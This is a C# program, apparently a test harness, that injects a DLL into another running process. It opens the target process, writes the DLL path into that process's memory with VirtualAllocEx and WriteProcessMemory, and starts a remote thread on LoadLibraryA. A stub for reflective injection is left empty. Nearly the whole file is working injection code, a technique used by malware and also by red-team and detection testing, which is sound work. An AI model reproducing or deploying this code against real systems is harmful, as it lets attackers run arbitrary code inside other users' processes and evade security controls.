using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ProcessInjection_Test1
{
    class InjectionTests
    {

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr procHandleess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandleess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandleess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // used for memory allocation
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        static void Main(string[] args)
        {

            // dllName is specified on CLI as: "C:\\dll.dll"
            string dllName = args[0];
            string processName = args[1];
            
            Console.WriteLine("[!] Process Injection Tests");

            crt_Injection(processName, dllName);



            return;

        }

        static void crt_Injection(string processName, string dllName)
        {

            byte[] bdll = System.Text.Encoding.Default.GetBytes(dllName);

            // Get a handle to the target process 
            // This is the process we're injecting INTO
            Console.WriteLine("[+] Attempting to find " + processName);
            Process proc = Process.GetProcessesByName(processName)[0];
            Console.WriteLine("[+] Got Process: " + proc.Id);
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Console.WriteLine("[+] Got Process Handle: " + procHandle.ToInt64());

            // Load the address of the LoadLibraryA function
            // We'll need this in order to actually LOAD our allocated memory when we call CRT
            IntPtr loadLibrary_Address = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            Console.WriteLine("[+] Got LoadLibraryA Address: " + loadLibrary_Address.ToInt64());

            // Now, we allocate some memory within the target process that we'll use for writing
            Console.WriteLine("[+] Allocating memory...");
            IntPtr virtualAllocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            Console.WriteLine("[+] Allocated Memory: " + virtualAllocMemAddress.ToString());

            // Here we write the path to the DLL we're injecting into the memory of the target process, using the address we saved when calling VirtualAllocEx
            Console.WriteLine("[+] Writing memory...");
            UIntPtr bytesWritten;
            bool res = WriteProcessMemory(procHandle, virtualAllocMemAddress, bdll, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            if (res == true)
            {
                Console.WriteLine("[+] Process memory written, wrote " + bytesWritten.ToString() + " bytes");
            }

            // Finally, we can run CRT with the handle of the target process, the address of LoadLibraryA and the address of the allocated memory
            Console.WriteLine("[!] Prerequisites satisfied, attempting to CreateRemoteThread...");
            var threadId = CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibrary_Address, virtualAllocMemAddress, 0, IntPtr.Zero);
            Console.WriteLine("[+] Created threadId: " + threadId.ToString());

            return;
        }


        static void reflective_Injection()
        {

            return;
        }
    }
}
